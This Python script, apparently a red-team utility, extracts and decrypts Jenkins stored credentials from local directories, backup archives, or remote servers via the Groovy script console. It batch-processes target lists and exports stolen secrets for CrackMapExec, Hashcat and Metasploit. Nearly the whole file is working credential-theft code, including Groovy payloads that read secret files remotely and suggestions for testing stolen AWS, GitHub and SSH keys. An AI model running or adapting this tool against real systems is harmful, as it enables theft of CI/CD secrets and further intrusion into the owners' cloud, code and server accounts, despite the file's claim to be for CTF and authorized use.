#!/usr/bin/env python3
"""
Jenkins Credential Decryptor PRO - World-Class Red Team Edition
Designed for CTF competitions, penetration testing, and authorized red team operations
"""
import os
import sys
import subprocess
from pathlib import Path

# --- Auto Virtualenv Bootstrapping ---
def bootstrap_virtualenv():
    venv_path = Path(__file__).resolve().parent / ".venv"
    
    if sys.platform == "win32":
        python_bin = venv_path / "Scripts" / "python.exe"
    else:
        python_bin = venv_path / "bin" / "python"
    
    if not os.environ.get("INSIDE_VENV") and sys.executable != str(python_bin):
        if not python_bin.exists():
            print("[*] Setting up virtualenv...", file=sys.stderr)
            try:
                subprocess.check_call([sys.executable, "-m", "venv", str(venv_path)], 
                                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except subprocess.CalledProcessError:
                print("[!] Virtualenv creation failed. Installing globally...", file=sys.stderr)
                try:
                    subprocess.check_call([sys.executable, "-m", "pip", "install", "pycryptodome", "requests", "-q", "--user"])
                except:
                    print("[-] Failed to install dependencies. Please run: pip install pycryptodome requests", file=sys.stderr)
                    sys.exit(1)
                return
        
        try:
            subprocess.check_call([str(python_bin), "-m", "pip", "install", "--upgrade", "pip", "pycryptodome", "requests", "-q"],
                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass
        
        env = os.environ.copy()
        env["INSIDE_VENV"] = "1"
        script_path = str(Path(__file__).resolve())
        result = subprocess.run([str(python_bin), script_path] + sys.argv[1:], env=env)
        sys.exit(result.returncode)

bootstrap_virtualenv()

# --- Core Imports ---
import re
import base64
import argparse
import json
import csv
import tarfile
import zipfile
import io
import tempfile
from hashlib import sha256
from datetime import datetime
from urllib.parse import urljoin, urlparse
from Crypto.Cipher import AES

try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

# --- Constants ---
SECRET_FIELDS = [
    'apiToken', 'password', 'privateKey', 'passphrase',
    'secret', 'secretId', 'value', 'defaultValue', 'token'
]

DECRYPTION_MAGIC = b'::::MAGIC::::'

CREDENTIAL_PATTERNS = {
    'aws_access_key': r'AKIA[0-9A-Z]{16}',
    'aws_secret_key': r'[A-Za-z0-9/+=]{40}',
    'github_token': r'ghp_[a-zA-Z0-9]{36}',
    'github_old_token': r'[a-f0-9]{40}',
    'slack_token': r'xox[baprs]-[0-9]{10,13}-[a-zA-Z0-9]{24,34}',
    'slack_webhook': r'https://hooks.slack.com/services/T[a-zA-Z0-9_]{8}/B[a-zA-Z0-9_]{8}/[a-zA-Z0-9_]{24}',
    'ssh_private_key': r'-----BEGIN (?:RSA |OPENSSH )?PRIVATE KEY-----',
    'docker_auth': r'"auth":\s*"[A-Za-z0-9+/=]+"',
    'jwt': r'eyJ[A-Za-z0-9-_=]+\.eyJ[A-Za-z0-9-_=]+\.[A-Za-z0-9-_.+/=]+',
    'api_key': r'api[_-]?key[\'"\s:=]+[A-Za-z0-9_\-]{20,}',
    'password': r'password[\'"\s:=]+[^\s\'"]{6,}',
}

# --- Core Decryption Functions ---
def decrypt_confidentiality_key(master_key, hudson_secret):
    """Decrypt the AES confidentiality key from master.key and hudson.util.Secret"""
    derived_master_key = sha256(master_key).digest()[:16]
    cipher = AES.new(derived_master_key, AES.MODE_ECB)
    decrypted = cipher.decrypt(hudson_secret)
    if DECRYPTION_MAGIC not in decrypted:
        return None
    return decrypted[:16]

def decrypt_secret_old_format(encrypted_secret, confidentiality_key):
    """Decrypt using old AES-ECB format"""
    cipher = AES.new(confidentiality_key, AES.MODE_ECB)
    decrypted = cipher.decrypt(encrypted_secret)
    if DECRYPTION_MAGIC not in decrypted:
        return None
    return decrypted.split(DECRYPTION_MAGIC)[0]

def decrypt_secret_new_format(encrypted_secret, confidentiality_key):
    """Decrypt using new AES-CBC format"""
    iv = encrypted_secret[9:9+16]
    cipher = AES.new(confidentiality_key, AES.MODE_CBC, iv)
    decrypted = cipher.decrypt(encrypted_secret[9+16:])
    padding = decrypted[-1]
    if padding > 16:
        return decrypted
    return decrypted[:-padding]

def decrypt_secret(encoded_secret, confidentiality_key):
    """Decrypt a base64-encoded Jenkins secret"""
    if not encoded_secret:
        return None
    try:
        encrypted = base64.b64decode(encoded_secret)
    except Exception:
        return None
    
    if len(encrypted) > 0 and encrypted[0] == 1:
        return decrypt_secret_new_format(encrypted, confidentiality_key)
    else:
        return decrypt_secret_old_format(encrypted, confidentiality_key)

# --- Remote Extraction ---
class RemoteJenkinsExtractor:
    """Extract credentials from remote Jenkins instance"""
    
    def __init__(self, base_url, username=None, password=None, api_token=None):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session() if HAS_REQUESTS else None
        self.username = username
        self.password = password
        self.api_token = api_token
        
        if self.session and (username and (password or api_token)):
            if api_token:
                self.session.auth = (username, api_token)
            else:
                self.session.auth = (username, password)
    
    def fetch_file_via_script(self, filepath):
        """Fetch a file from Jenkins using Groovy script console"""
        if not HAS_REQUESTS:
            raise Exception("requests library required for remote extraction")
        
        # Try scriptText endpoint first (returns plain text)
        script_url = urljoin(self.base_url, '/scriptText')
        
        # Groovy script to read file and return base64 encoded content
        groovy_script = f"""
import jenkins.model.Jenkins
import java.util.Base64

def jenkinsHome = Jenkins.instance.rootDir
def targetFile = new File(jenkinsHome, '{filepath}')

if (targetFile.exists()) {{
    def bytes = targetFile.bytes
    println(Base64.encoder.encodeToString(bytes))
}} else {{
    println('FILE_NOT_FOUND')
}}
"""
        
        try:
            resp = self.session.post(script_url, data={'script': groovy_script}, 
                                   verify=False, timeout=15)
            if resp.status_code == 200:
                result = resp.text.strip()
                if result and result != 'FILE_NOT_FOUND':
                    # Decode from base64
                    import base64
                    try:
                        return base64.b64decode(result)
                    except:
                        # Maybe it's already plain text
                        return result.encode('utf-8')
            return None
        except Exception as e:
            print(f"[-] Script console access failed for {filepath}: {e}", file=sys.stderr)
            return None
    
    def fetch_file(self, path):
        """Fetch a file from Jenkins using script console"""
        return self.fetch_file_via_script(path)
    
    def extract_credentials(self):
        """Extract master.key, hudson.util.Secret/secret.key, and credentials.xml via script console"""
        files = {}
        
        print("[*] Using Jenkins Script Console for extraction", file=sys.stderr)
        
        # Extract master.key
        print(f"[*] Extracting master.key...", file=sys.stderr)
        master_key = self.fetch_file('secrets/master.key')
        if master_key:
            files['master.key'] = master_key
            print(f"[+] Retrieved master.key ({len(master_key)} bytes)", file=sys.stderr)
        else:
            print(f"[-] Failed to retrieve master.key", file=sys.stderr)
        
        # Try both old (hudson.util.Secret) and new (secret.key) formats
        print(f"[*] Extracting hudson.util.Secret...", file=sys.stderr)
        hudson_secret = self.fetch_file('secrets/hudson.util.Secret')
        if hudson_secret:
            files['hudson.util.Secret'] = hudson_secret
            print(f"[+] Retrieved hudson.util.Secret ({len(hudson_secret)} bytes)", file=sys.stderr)
        else:
            print(f"[*] hudson.util.Secret not found, trying secret.key (newer Jenkins)...", file=sys.stderr)
            secret_key = self.fetch_file('secret.key')
            if secret_key:
                files['hudson.util.Secret'] = secret_key  # Use same key name internally
                print(f"[+] Retrieved secret.key ({len(secret_key)} bytes)", file=sys.stderr)
            else:
                print(f"[-] Failed to retrieve secret files", file=sys.stderr)
        
        # Extract credentials.xml
        print(f"[*] Extracting credentials.xml...", file=sys.stderr)
        creds_xml = self.fetch_file('credentials.xml')
        if creds_xml:
            files['credentials.xml'] = creds_xml
            print(f"[+] Retrieved credentials.xml ({len(creds_xml)} bytes)", file=sys.stderr)
        else:
            print(f"[-] credentials.xml not found in root, checking secrets/ directory...", file=sys.stderr)
            # Try secrets directory
            creds_xml = self.fetch_file('secrets/credentials.xml')
            if creds_xml:
                files['credentials.xml'] = creds_xml
                print(f"[+] Retrieved secrets/credentials.xml ({len(creds_xml)} bytes)", file=sys.stderr)
        
        # Also try to extract credential files from secrets directory
        credential_files = ['aws_credentials', 'api_keys.env', 'database_credentials.env', 'docker_config.json']
        for cred_file in credential_files:
            content = self.fetch_file(f'secrets/{cred_file}')
            if content:
                files[cred_file] = content
                print(f"[+] Retrieved {cred_file} ({len(content)} bytes)", file=sys.stderr)
        
        return files

# --- Quick Extraction Mode ---
def quick_extract(jenkins_path_or_url, output_format='text', reveal=True, username=None, password=None, api_token=None):
    """Ultra-fast one-liner extraction for CTF scenarios"""
    print("[*] QUICK EXTRACT MODE", file=sys.stderr)
    
    # Detect if remote or local
    if jenkins_path_or_url.startswith('http://') or jenkins_path_or_url.startswith('https://'):
        print("[*] Remote Jenkins detected", file=sys.stderr)
        extractor = RemoteJenkinsExtractor(jenkins_path_or_url, username=username, password=password, api_token=api_token)
        files = extractor.extract_credentials()
        
        if 'master.key' not in files or 'hudson.util.Secret' not in files:
            print("[-] Failed to retrieve required files from remote Jenkins", file=sys.stderr)
            return []
        
        master_key = files['master.key'].strip()
        hudson_secret = files['hudson.util.Secret']
        creds_xml = files.get('credentials.xml', b'<root/>')
        
    else:
        # Local extraction
        jenkins_path = Path(jenkins_path_or_url)
        master_key_file = jenkins_path / "secrets" / "master.key"
        hudson_secret_file = jenkins_path / "secrets" / "hudson.util.Secret"
        creds_file = jenkins_path / "credentials.xml"
        
        if not master_key_file.exists() or not hudson_secret_file.exists():
            print(f"[-] Required files not found in {jenkins_path}", file=sys.stderr)
            return []
        
        with open(master_key_file, 'rb') as f:
            master_key = f.read().strip()
        with open(hudson_secret_file, 'rb') as f:
            hudson_secret = f.read().strip()
        with open(creds_file, 'r', encoding='utf-8', errors='ignore') as f:
            creds_xml = f.read()
    
    # Decrypt
    if isinstance(master_key, str):
        master_key = master_key.encode('utf-8')
    
    # Try to decrypt confidentiality key (old format)
    confidentiality_key = decrypt_confidentiality_key(master_key, hudson_secret)
    
    # If decryption failed, check if hudson_secret is actually secret.key (new format)
    # In newer Jenkins, secret.key is already the key, not encrypted
    if not confidentiality_key and len(hudson_secret) >= 16:
        print("[*] Trying newer Jenkins format (secret.key as direct key)...", file=sys.stderr)
        # For newer Jenkins, secret.key is hex-encoded or raw bytes
        # Let's try using it directly as the key (first 16 bytes for AES-128)
        confidentiality_key = hudson_secret[:16]
        
        # If that doesn't work, try hex decode
        if confidentiality_key and len(confidentiality_key) < 16:
            try:
                confidentiality_key = bytes.fromhex(hudson_secret.decode('utf-8').strip())[:16]
            except:
                pass
    
    if not confidentiality_key:
        print("[-] Failed to derive confidentiality key", file=sys.stderr)
        print("[!] Note: Newer Jenkins versions may store secrets differently", file=sys.stderr)
        # Still continue to extract plaintext credentials from env files
        confidentiality_key = None
    
    # Extract secrets from credentials.xml
    secrets = []
    if confidentiality_key and creds_xml:
        if isinstance(creds_xml, bytes):
            creds_xml = creds_xml.decode('utf-8', errors='ignore')
        
        found_encrypted = []
        for field in SECRET_FIELDS:
            found_encrypted += re.findall(field + r'>\{?(.*?)\}?<\/' + field, creds_xml)
        found_encrypted += re.findall(r'>{([a-zA-Z0-9=+/]{20,})}<\/', creds_xml)
        
        for encrypted in set(found_encrypted):
            decrypted = decrypt_secret(encrypted, confidentiality_key)
            if decrypted:
                try:
                    secret_text = decrypted.decode('utf-8', errors='ignore')
                    secrets.append(secret_text)
                    if reveal:
                        print(secret_text)
                except:
                    pass
    
    # Also extract plaintext credentials from additional files (remote extraction)
    if jenkins_path_or_url.startswith('http://') or jenkins_path_or_url.startswith('https://'):
        for filename in ['aws_credentials', 'api_keys.env', 'database_credentials.env', 'docker_config.json']:
            if filename in files:
                content = files[filename]
                if isinstance(content, bytes):
                    content = content.decode('utf-8', errors='ignore')
                
                # Parse environment files or JSON
                for line in content.splitlines():
                    line = line.strip()
                    if line and not line.startswith('#') and '=' in line:
                        # Extract value from KEY=VALUE format
                        key, value = line.split('=', 1)
                        value = value.strip().strip('"').strip("'")
                        if value and len(value) > 3:
                            secrets.append(value)
                            if reveal:
                                print(f"{filename}: {key}={value}")
    
    return secrets

# --- Batch Processing ---
def batch_extract(targets_file, output_dir):
    """Process multiple Jenkins instances from a file"""
    print(f"[*] Batch extraction from {targets_file}", file=sys.stderr)
    
    with open(targets_file, 'r') as f:
        targets = [line.strip() for line in f if line.strip() and not line.startswith('#')]
    
    output_dir = Path(output_dir)
    output_dir.mkdir(parents=True, exist_ok=True)
    
    results = {}
    for i, target in enumerate(targets, 1):
        print(f"\n[*] Processing target {i}/{len(targets)}: {target}", file=sys.stderr)
        try:
            secrets = quick_extract(target, reveal=False)
            results[target] = {
                'success': len(secrets) > 0,
                'secret_count': len(secrets),
                'secrets': secrets
            }
            
            # Save individual result
            safe_name = re.sub(r'[^\w\-]', '_', target)
            output_file = output_dir / f"{safe_name}.json"
            with open(output_file, 'w') as f:
                json.dump(results[target], f, indent=2)
            
            print(f"[+] Extracted {len(secrets)} secrets -> {output_file}", file=sys.stderr)
        except Exception as e:
            print(f"[-] Failed: {e}", file=sys.stderr)
            results[target] = {'success': False, 'error': str(e)}
    
    # Save summary
    summary_file = output_dir / "batch_summary.json"
    with open(summary_file, 'w') as f:
        json.dump(results, f, indent=2)
    
    print(f"\n[+] Batch complete: {summary_file}", file=sys.stderr)
    return results

# --- Credential Analysis ---
def analyze_credentials(secrets):
    """Analyze and categorize extracted credentials"""
    analysis = {
        'total': len(secrets),
        'categorized': {},
        'high_value': [],
        'recommendations': []
    }
    
    for secret in secrets:
        for cred_type, pattern in CREDENTIAL_PATTERNS.items():
            if re.search(pattern, secret, re.IGNORECASE):
                if cred_type not in analysis['categorized']:
                    analysis['categorized'][cred_type] = []
                analysis['categorized'][cred_type].append(secret)
                
                # Mark high-value credentials
                if cred_type in ['aws_access_key', 'ssh_private_key', 'github_token']:
                    analysis['high_value'].append({
                        'type': cred_type,
                        'value': secret
                    })
    
    # Generate recommendations
    if 'aws_access_key' in analysis['categorized']:
        analysis['recommendations'].append("Test AWS keys: aws sts get-caller-identity")
    if 'github_token' in analysis['categorized']:
        analysis['recommendations'].append("Test GitHub tokens: curl -H 'Authorization: token TOKEN' https://api.github.com/user")
    if 'ssh_private_key' in analysis['categorized']:
        analysis['recommendations'].append("Try SSH keys against known hosts with ssh-keyscan")
    
    return analysis

# --- Export Formats ---
def export_crackmapexec(secrets, output_file):
    """Export in CrackMapExec format"""
    with open(output_file, 'w') as f:
        for secret in secrets:
            if len(secret) > 3 and len(secret) < 100:
                f.write(f"{secret}\n")
    print(f"[+] CrackMapExec wordlist: {output_file}")

def export_hashcat(secrets, output_file):
    """Export potential passwords for Hashcat"""
    with open(output_file, 'w') as f:
        for secret in secrets:
            # Filter for password-like strings
            if 6 <= len(secret) <= 64 and not secret.startswith(('http', '-----BEGIN')):
                f.write(f"{secret}\n")
    print(f"[+] Hashcat wordlist: {output_file}")

def export_metasploit(secrets, output_file):
    """Export in Metasploit RC script format"""
    with open(output_file, 'w') as f:
        f.write("# Metasploit RC Script - Jenkins Credentials\n")
        f.write("# Generated: {}\n\n".format(datetime.now().isoformat()))
        
        for i, secret in enumerate(secrets):
            if 6 <= len(secret) <= 100:
                f.write(f"# Credential {i+1}\n")
                f.write(f"creds add user:admin password:{secret}\n\n")
    print(f"[+] Metasploit RC script: {output_file}")

# --- Archive Extraction ---
def extract_from_archive(archive_path):
    """Extract Jenkins credentials from backup archives"""
    archive_path = Path(archive_path)
    temp_dir = Path(tempfile.mkdtemp(prefix='jenkins_'))
    
    print(f"[*] Extracting archive to {temp_dir}", file=sys.stderr)
    
    try:
        if archive_path.suffix in ['.tar', '.tar.gz', '.tgz']:
            with tarfile.open(archive_path, 'r:*') as tar:
                tar.extractall(temp_dir)
        elif archive_path.suffix == '.zip':
            with zipfile.ZipFile(archive_path, 'r') as zip_file:
                zip_file.extractall(temp_dir)
        else:
            print(f"[-] Unsupported archive format: {archive_path.suffix}", file=sys.stderr)
            return None
        
        # Find Jenkins home
        jenkins_dirs = list(temp_dir.glob('**/secrets'))
        if jenkins_dirs:
            jenkins_home = jenkins_dirs[0].parent
            print(f"[+] Found Jenkins home: {jenkins_home}", file=sys.stderr)
            return jenkins_home
        else:
            print("[-] No Jenkins secrets directory found in archive", file=sys.stderr)
            return None
    except Exception as e:
        print(f"[-] Archive extraction failed: {e}", file=sys.stderr)
        return None

# --- CLI ---
def parse_arguments():
    parser = argparse.ArgumentParser(
        description="Jenkins Credential Decryptor PRO - World-Class Red Team Edition",
        epilog="""
Examples:
  # Quick extract (CTF mode)
  %(prog)s --quick /var/jenkins_home
  
  # Remote extraction
  %(prog)s --quick https://jenkins.target.com --username admin --api-token TOKEN
  
  # Batch processing
  %(prog)s --batch targets.txt --output-dir loot/
  
  # Archive extraction
  %(prog)s --archive jenkins_backup.tar.gz --reveal-secrets
  
  # Export for CrackMapExec
  %(prog)s --quick /var/jenkins_home --export-cme passwords.txt
  
  # Full analysis
  %(prog)s --quick /var/jenkins_home --analyze --export-all loot/
        """,
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    
    # Input modes
    input_group = parser.add_mutually_exclusive_group()
    input_group.add_argument("--quick", metavar="PATH_OR_URL",
                            help="Quick extraction from local path or remote URL")
    input_group.add_argument("--batch", metavar="FILE",
                            help="Batch process multiple targets from file")
    input_group.add_argument("--archive", metavar="FILE",
                            help="Extract from backup archive (tar.gz, zip)")
    
    # Remote options
    parser.add_argument("--username", metavar="USER",
                       help="Username for remote authentication")
    parser.add_argument("--password", metavar="PASS",
                       help="Password for remote authentication")
    parser.add_argument("--api-token", metavar="TOKEN",
                       help="API token for remote authentication")
    
    # Output options
    parser.add_argument("--reveal-secrets", action="store_true",
                       help="Show plaintext secrets (default: enabled in quick mode)")
    parser.add_argument("--analyze", action="store_true",
                       help="Analyze and categorize extracted credentials")
    parser.add_argument("--output-dir", metavar="DIR",
                       help="Output directory for batch/export operations")
    
    # Export formats
    parser.add_argument("--export-json", metavar="FILE",
                       help="Export to JSON")
    parser.add_argument("--export-csv", metavar="FILE",
                       help="Export to CSV")
    parser.add_argument("--export-cme", metavar="FILE",
                       help="Export for CrackMapExec")
    parser.add_argument("--export-hashcat", metavar="FILE",
                       help="Export for Hashcat")
    parser.add_argument("--export-metasploit", metavar="FILE",
                       help="Export Metasploit RC script")
    parser.add_argument("--export-all", metavar="DIR",
                       help="Export in all formats to directory")
    
    # Misc
    parser.add_argument("--quiet", action="store_true",
                       help="Suppress informational messages")
    parser.add_argument("--force", action="store_true",
                       help="Overwrite existing files")
    
    return parser.parse_args()

def main():
    args = parse_arguments()
    
    if not args.quiet:
        print("""
╔═══════════════════════════════════════════════════════════════╗
║     Jenkins Credential Decryptor PRO - Red Team Edition       ║
║                   World-Class CTF & Pentest Tool              ║
╚═══════════════════════════════════════════════════════════════╝
        """, file=sys.stderr)
    
    secrets = []
    
    # Quick extract mode
    if args.quick:
        secrets = quick_extract(args.quick, reveal=args.reveal_secrets or not args.quiet,
                               username=args.username, password=args.password, api_token=args.api_token)
    
    # Batch mode
    elif args.batch:
        output_dir = args.output_dir or 'batch_output'
        batch_extract(args.batch, output_dir)
        return
    
    # Archive mode
    elif args.archive:
        jenkins_home = extract_from_archive(args.archive)
        if jenkins_home:
            secrets = quick_extract(str(jenkins_home), reveal=args.reveal_secrets)
    
    else:
        print("[-] No extraction mode specified. Use --quick, --batch, or --archive", file=sys.stderr)
        print("[-] Run with --help for usage examples", file=sys.stderr)
        return 1
    
    if not secrets:
        print("\n[-] No secrets extracted", file=sys.stderr)
        return 1
    
    print(f"\n[+] Extracted {len(secrets)} secrets", file=sys.stderr)
    
    # Analysis
    if args.analyze:
        print("\n[*] Analyzing credentials...", file=sys.stderr)
        analysis = analyze_credentials(secrets)
        print(f"\n[+] Analysis Results:", file=sys.stderr)
        print(f"    Total secrets: {analysis['total']}", file=sys.stderr)
        print(f"    High-value credentials: {len(analysis['high_value'])}", file=sys.stderr)
        for cred_type, items in analysis['categorized'].items():
            print(f"    {cred_type}: {len(items)}", file=sys.stderr)
        
        if analysis['recommendations']:
            print(f"\n[!] Recommendations:", file=sys.stderr)
            for rec in analysis['recommendations']:
                print(f"    - {rec}", file=sys.stderr)
    
    # Export
    if args.export_all:
        export_dir = Path(args.export_all)
        export_dir.mkdir(parents=True, exist_ok=True)
        
        export_json_file = export_dir / "secrets.json"
        with open(export_json_file, 'w') as f:
            json.dump({'secrets': secrets, 'count': len(secrets)}, f, indent=2)
        print(f"[+] JSON export: {export_json_file}", file=sys.stderr)
        
        export_crackmapexec(secrets, export_dir / "cme_passwords.txt")
        export_hashcat(secrets, export_dir / "hashcat_wordlist.txt")
        export_metasploit(secrets, export_dir / "metasploit.rc")
        
        with open(export_dir / "plaintext.txt", 'w') as f:
            for secret in secrets:
                f.write(f"{secret}\n")
        print(f"[+] Plaintext export: {export_dir / 'plaintext.txt'}", file=sys.stderr)
    
    elif args.export_json:
        with open(args.export_json, 'w') as f:
            json.dump({'secrets': secrets, 'count': len(secrets)}, f, indent=2)
        print(f"[+] JSON export: {args.export_json}", file=sys.stderr)
    
    elif args.export_cme:
        export_crackmapexec(secrets, args.export_cme)
    
    elif args.export_hashcat:
        export_hashcat(secrets, args.export_hashcat)
    
    elif args.export_metasploit:
        export_metasploit(secrets, args.export_metasploit)
    
    print("\n[+] Extraction complete!", file=sys.stderr)
    return 0

if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user", file=sys.stderr)
        sys.exit(130)
    except Exception as e:
        print(f"\n[-] Fatal error: {e}", file=sys.stderr)
        sys.exit(1)
